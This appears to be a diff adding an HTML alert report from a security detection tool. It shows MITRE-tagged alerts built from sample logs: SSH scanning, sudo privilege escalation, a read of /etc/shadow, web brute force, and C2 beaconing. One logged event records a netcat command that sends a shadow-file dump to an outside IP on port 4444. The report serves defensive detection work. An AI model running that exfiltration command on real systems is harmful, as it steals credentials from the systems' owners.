+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Recon to Exploitation Chain - Port Scan Followed by Auth Attempt: 2-step sequence completed for src_ip='185.220.101.47' over 60s</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:07:30</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">10.0.1.35</span>  <span style="color:#555">dest_port=</span><span style="color:#777">22</span>  <span style="color:#555">scan_detected=</span><span style="color:#777">true</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:08:30</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">db-prod-02</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:09:24</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Repeated Sudo Failure</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1548/003/" style="color:#555;text-decoration:none" target="_blank">
+        T1548.003
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Repeated Sudo Failure: 3+ events from user='deploy' in 60s window (3 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:09:00</span> <span style="color:#555">sudo_failure</span> <span style="color:#555">user=</span><span style="color:#777">deploy</span>  <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">command=</span><span style="color:#777">sudo su -</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:09:12</span> <span style="color:#555">sudo_failure</span> <span style="color:#555">user=</span><span style="color:#777">deploy</span>  <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">command=</span><span style="color:#777">sudo su -</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:09:24</span> <span style="color:#555">sudo_failure</span> <span style="color:#555">user=</span><span style="color:#777">deploy</span>  <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">command=</span><span style="color:#777">sudo su -</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:09:36</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Repeated Sudo Failure</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1548/003/" style="color:#555;text-decoration:none" target="_blank">
+        T1548.003
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Repeated Sudo Failure: 3+ events from user='deploy' in 60s window (4 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:09:00</span> <span style="color:#555">sudo_failure</span> <span style="color:#555">user=</span><span style="color:#777">deploy</span>  <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">command=</span><span style="color:#777">sudo su -</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:09:12</span> <span style="color:#555">sudo_failure</span> <span style="color:#555">user=</span><span style="color:#777">deploy</span>  <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">command=</span><span style="color:#777">sudo su -</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:09:24</span> <span style="color:#555">sudo_failure</span> <span style="color:#555">user=</span><span style="color:#777">deploy</span>  <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">command=</span><span style="color:#777">sudo su -</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:09:36</span> <span style="color:#555">sudo_failure</span> <span style="color:#555">user=</span><span style="color:#777">deploy</span>  <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">command=</span><span style="color:#777">sudo su -</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:10:20</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">Privilege Escalation via Sudo - Failure Then Success</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1548/003/" style="color:#555;text-decoration:none" target="_blank">
+        T1548.003
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Privilege Escalation via Sudo - Failure Then Success: 2-step sequence completed for user='deploy' over 80s</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:09:00</span> <span style="color:#555">sudo_failure</span> <span style="color:#555">user=</span><span style="color:#777">deploy</span>  <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">command=</span><span style="color:#777">sudo su -</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:10:20</span> <span style="color:#555">sudo_success</span> <span style="color:#555">user=</span><span style="color:#777">deploy</span>  <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">command=</span><span style="color:#777">sudo su -</span>  <span style="color:#555">detail=</span><span style="color:#777">Privilege escalation to root</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:10:40</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">Sensitive Credential File Accessed</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1003/008/" style="color:#555;text-decoration:none" target="_blank">
+        T1003.008
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Sensitive Credential File Accessed: user='root', file_path='/etc/shadow', process='python3'</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:10:40</span> <span style="color:#555">file_access</span> <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span>  <span style="color:#555">file_path=</span><span style="color:#777">/etc/shadow</span>  <span style="color:#555">access_type=</span><span style="color:#777">read</span>  <span style="color:#555">process=</span><span style="color:#777">python3</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:11:35</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">Suspicious Process Execution</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1059/004/" style="color:#555;text-decoration:none" target="_blank">
+        T1059.004
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Suspicious Process Execution: user='root', process='nc'</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:11:35</span> <span style="color:#555">process_exec</span> <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span>  <span style="color:#555">process=</span><span style="color:#777">nc</span>  <span style="color:#555">args=</span><span style="color:#777">-w3 91.108.4.200 4444 &lt; /tmp/.shadow_dump</span>  <span style="color:#555">detail=</span><span style="color:#777">Netcat exfiltration of credential dump</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff4444">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:11:35</span>
+    <span style="background:#ff4444;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">critical</span>
+    <span class="alert-title">Credential Dump Pattern - Shadow Read Followed by Process Exec</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1003/008/" style="color:#555;text-decoration:none" target="_blank">
+        T1003.008
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Credential Dump Pattern - Shadow Read Followed by Process Exec: 2-step sequence completed for host='web-prod-01' over 55s</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:10:40</span> <span style="color:#555">file_access</span> <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span>  <span style="color:#555">file_path=</span><span style="color:#777">/etc/shadow</span>  <span style="color:#555">access_type=</span><span style="color:#777">read</span>  <span style="color:#555">process=</span><span style="color:#777">python3</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:11:35</span> <span style="color:#555">process_exec</span> <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span>  <span style="color:#555">process=</span><span style="color:#777">nc</span>  <span style="color:#555">args=</span><span style="color:#777">-w3 91.108.4.200 4444 &lt; /tmp/.shadow_dump</span>  <span style="color:#555">detail=</span><span style="color:#777">Netcat exfiltration of credential dump</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:12:45</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Web Application Authentication Brute Force</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1110/" style="color:#555;text-decoration:none" target="_blank">
+        T1110
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Web Application Authentication Brute Force: 10+ events from src_ip='185.220.101.47' in 60s window (10 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:00</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:05</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:10</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:15</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:20</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 5 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:12:50</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Web Application Authentication Brute Force</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1110/" style="color:#555;text-decoration:none" target="_blank">
+        T1110
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Web Application Authentication Brute Force: 10+ events from src_ip='185.220.101.47' in 60s window (11 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:00</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:05</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:10</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:15</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:20</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 6 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:12:55</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Web Application Authentication Brute Force</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1110/" style="color:#555;text-decoration:none" target="_blank">
+        T1110
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Web Application Authentication Brute Force: 10+ events from src_ip='185.220.101.47' in 60s window (12 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:00</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:05</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:10</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:15</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:12:20</span> <span style="color:#555">http_auth_failure</span> <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">path=</span><span style="color:#777">/admin/login</span>  <span style="color:#555">user_agent=</span><span style="color:#777">python-requests/2.31.0</span>  <span style="color:#555">status_code=</span><span style="color:#777">401</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 7 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:14:10</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Multiple Account Lockouts</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1110/" style="color:#555;text-decoration:none" target="_blank">
+        T1110
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Multiple Account Lockouts: 3+ events from dest_host='web-prod-01' in 120s window (3 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:13:30</span> <span style="color:#555">account_lockout</span> <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">alice</span>  <span style="color:#555">detail=</span><span style="color:#777">Account locked after repeated failures</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:13:50</span> <span style="color:#555">account_lockout</span> <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">bob</span>  <span style="color:#555">detail=</span><span style="color:#777">Account locked after repeated failures</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:14:10</span> <span style="color:#555">account_lockout</span> <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">charlie</span>  <span style="color:#555">detail=</span><span style="color:#777">Account locked after repeated failures</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:24:55</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Potential C2 Beacon - Repeated Outbound Connections</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1071/001/" style="color:#555;text-decoration:none" target="_blank">
+        T1071.001
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Potential C2 Beacon - Repeated Outbound Connections: 8+ events from dest_ip='91.108.4.200' in 900s window (8 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:15:00</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:16:25</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:17:50</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:19:15</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:20:40</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 3 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:26:20</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Potential C2 Beacon - Repeated Outbound Connections</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1071/001/" style="color:#555;text-decoration:none" target="_blank">
+        T1071.001
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Potential C2 Beacon - Repeated Outbound Connections: 8+ events from dest_ip='91.108.4.200' in 900s window (9 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:15:00</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:16:25</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:17:50</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span 